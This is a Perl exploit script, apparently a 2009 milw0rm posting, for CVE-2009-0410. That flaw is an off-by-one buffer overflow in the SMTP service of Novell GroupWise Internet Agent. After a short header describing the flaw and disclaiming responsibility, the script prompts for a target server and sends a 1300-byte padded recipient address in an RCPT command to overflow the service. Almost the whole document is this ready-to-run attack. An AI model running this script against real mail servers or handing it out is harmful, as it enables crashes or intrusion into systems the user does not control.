<html><head><title>Novell GroupWise <= 8.0 Malformed RCPT command Off-by-one Exploit</title></head><pre>#!usr/bin/perl -w

#######################################################################################
###############################QUICK AND DIRTY EXPLOIT#################################
#######################################################################################
#   Off-by-one error in the SMTP daemon in GroupWise Internet Agent (GWIA)
#    in Novell GroupWise 6.5x, 7.0, 7.01, 7.02, 7.03, 7.03HP1a, and 8.0 allows
#    remote attackers to execute arbitrary code via a long e-mail address in a
#    malformed RCPT command, leading to a buffer overflow.
#    Refer:
#    http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-0410
#
#    To run this exploit on MS Windows replace &quot;#!usr/bin/perl -w&quot; with
#     &quot;#!Installation_path_for_perl -w&quot; (say #!C:/Program Files/Perl/bin/perl -w)
#
#$$$$$This was strictly written for educational purpose. Use it at your own risk.$$$$$
#$$$$$Author will not bare any responsibility for any damages watsoever.$$$$$$$$$$$$$$
#
#        Author:    Praveen Darshanam
#        Email:     praveen[underscore]recker[at]sify.com\
#         Blog:        http://www.darshanams.blogspot.com/
#        Date:      04th February, 2009
#
########Thanx to str0ke, milw0rm, @rp m@n, an all the security folks####################
########################################################################################


use Net::SMTP;
print &quot;***SMTP module is working fine***\n&quot;;


$buff=&quot;D&quot; x 1300;
print &quot;Enter Vulnerable Novell GroupWise SMTP Server Domain Name\n&quot;;
$smtp_vuln_server_name=&lt;STDIN&gt;;
chop($smtp_vuln_server_name);

$smtp_attack=Net::SMTP-&gt;new(&quot;$smtp_vuln_server_name&quot;);
print&quot;\nEnter your/from mail ID here\n&quot;;
$$mail_from=&lt;STDIN&gt;;
chop($mail_from);


print&quot;\nEnter Recepient mail ID\n&quot;;
$to_mail_id=&lt;STDIN&gt;;
chop($to_mail_id);

$mal_buffer=$buff.$to_mail_id;

$smtp_attack-&gt;mail($mail_from);
$smtp_attack-&gt;to($mal_buffer);

$smtp_attack-&gt;data();
$smtp_attack-&gt;datasend(&quot;Attacking...&quot;);

$smtp_attack-&gt;quit();

# milw0rm.com [2009-02-04]</pre></html>